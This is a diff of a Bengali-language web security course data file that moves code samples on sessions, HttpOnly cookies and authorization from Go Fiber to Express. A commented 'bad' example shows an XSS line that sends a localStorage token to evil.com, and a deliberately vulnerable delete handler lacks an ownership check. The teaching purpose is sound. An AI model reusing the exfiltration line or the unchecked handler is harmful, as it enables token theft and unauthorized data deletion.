@@ -168,7 +168,7 @@ export default [
       {
         title: 'Session-based authentication',
         body: 'Login সফল হলে server একটি র‍্যান্ডম session ID তৈরি করে, Redis-এ রাখে (session:abc123 → user_id=7), আর browser-কে Set-Cookie দিয়ে পাঠায়। পরের প্রতিটি request-এ browser নিজে থেকেই cookie পাঠায়, server Redis-এ খুঁজে user চেনে।',
-        code: [{ label: 'Go Fiber · session store (Redis)', lang: 'go', kind: 'good', text: 'store := session.New(session.Config{\n    Storage:        redisStore,\n    CookieHTTPOnly: true,\n    CookieSecure:   true,\n    CookieSameSite: "Lax",\n    Expiration:     24 * time.Hour,\n})' }],
+        code: [{ label: 'Express · session store (Redis)', lang: 'js', kind: 'good', text: 'import session from \'express-session\';\nimport { RedisStore } from \'connect-redis\';\n\napp.use(session({\n  store: new RedisStore({ client: redisClient }),\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    httpOnly: true,                // JavaScript পড়তে পারবে না\n    secure: true,                  // শুধু HTTPS-এ যাবে\n    sameSite: \'lax\',\n    maxAge: 24 * 60 * 60 * 1000,   // ২৪ ঘণ্টা\n  },\n}));' }],
         points: ['সুবিধা: server যেকোনো সময় session revoke করতে পারে', 'অসুবিধা: server-side storage লাগে (Redis)'],
       },
       {
@@ -193,7 +193,7 @@ export default [
         body: 'Attacker যদি তোমার session cookie বা token পেয়ে যায়, তাহলে password ছাড়াই সে "তুমি" হয়ে যায়। চুরির পথ: XSS (HttpOnly না থাকলে), HTTP-তে sniffing (Secure না থাকলে), malware, log-এ token লেখা, URL-এ token পাঠানো।',
         code: [
           { label: 'দুর্বল — localStorage-এ token', lang: 'js', kind: 'bad', text: "localStorage.setItem('token', jwt)\n// যেকোনো XSS script এটা পড়তে পারে:\n// fetch('https://evil.com/?t=' + localStorage.token)" },
-          { label: 'নিরাপদ — HttpOnly cookie', lang: 'go', kind: 'good', text: 'c.Cookie(&fiber.Cookie{\n    Name: "refresh", Value: rt,\n    HTTPOnly: true, Secure: true, SameSite: "Strict",\n})' },
+          { label: 'নিরাপদ — HttpOnly cookie', lang: 'js', kind: 'good', text: 'res.cookie(\'refresh\', refreshToken, {\n  httpOnly: true, secure: true, sameSite: \'strict\',\n});' },
         ],
         tip: 'Login-এর পর session ID নতুন করে তৈরি করো (Session Fixation প্রতিরোধ)।',
       },
@@ -241,14 +241,14 @@ export default [
         title: 'দুর্বল কোড বনাম নিরাপদ কোড',
         body: 'নিচের handler শুধু login চেক করে, ownership নয়:',
         code: [
-          { label: 'দুর্বল · Go Fiber', lang: 'go', kind: 'bad', text: 'app.Delete("/api/orders/:id", requireLogin, func(c *fiber.Ctx) error {\n    db.Exec("DELETE FROM orders WHERE id=$1", c.Params("id"))\n    return c.SendStatus(204)\n})' },
-          { label: 'নিরাপদ · ownership check', lang: 'go', kind: 'good', text: 'app.Delete("/api/orders/:id", requireLogin, func(c *fiber.Ctx) error {\n    uid := c.Locals("userID").(int64)\n    res, _ := db.Exec(\n        "DELETE FROM orders WHERE id=$1 AND user_id=$2",\n        c.Params("id"), uid)\n    if n, _ := res.RowsAffected(); n == 0 {\n        return c.SendStatus(404) // existence লুকাও\n    }\n    return c.SendStatus(204)\n})' },
+          { label: 'দুর্বল · Express', lang: 'js', kind: 'bad', text: 'app.delete(\'/api/orders/:id\', requireLogin, async (req, res) => {\n  await db.query(\'DELETE FROM orders WHERE id = $1\', [req.params.id]);\n  res.sendStatus(204);\n});' },
+          { label: 'নিরাপদ · ownership check', lang: 'js', kind: 'good', text: 'app.delete(\'/api/orders/:id\', requireLogin, async (req, res) => {\n  const result = await db.query(\n    \'DELETE FROM orders WHERE id = $1 AND user_id = $2\',\n    [req.params.id, req.user.id],\n  );\n  if (result.rowCount === 0) return res.sendStatus(404); // existence লুকাও\n  res.sendStatus(204);\n});' },
         ],
       },
       {
         title: 'Role-based middleware',
         body: 'Admin route-এ role যাচাই middleware দিয়ে করো, এবং role নাও server-side session/DB থেকে — কখনো request body বা client-controlled header থেকে নয়।',
-        code: [{ label: 'requireRole middleware', lang: 'go', kind: 'good', text: 'func requireRole(role string) fiber.Handler {\n    return func(c *fiber.Ctx) error {\n        if c.Locals("role") != role {\n            return c.SendStatus(fiber.StatusForbidden)\n        }\n        return c.Next()\n    }\n}\nadmin := app.Group("/api/admin", requireLogin, requireRole("admin"))' }],
+        code: [{ label: 'requireRole middleware', lang: 'js', kind: 'good', text: 'const requireRole = (role) => (req, res, next) => {\n  if (req.user?.role !== role) return res.sendStatus(403);\n  next();\n};\n\napp.use(\'/api/admin\', requireLogin, requireRole(\'admin\'));' }],
         tip: 'Deny by default: নতুন route তৈরি হলে ডিফল্টে বন্ধ থাকুক, স্পষ্টভাবে অনুমতি দাও।',
       },
     ],
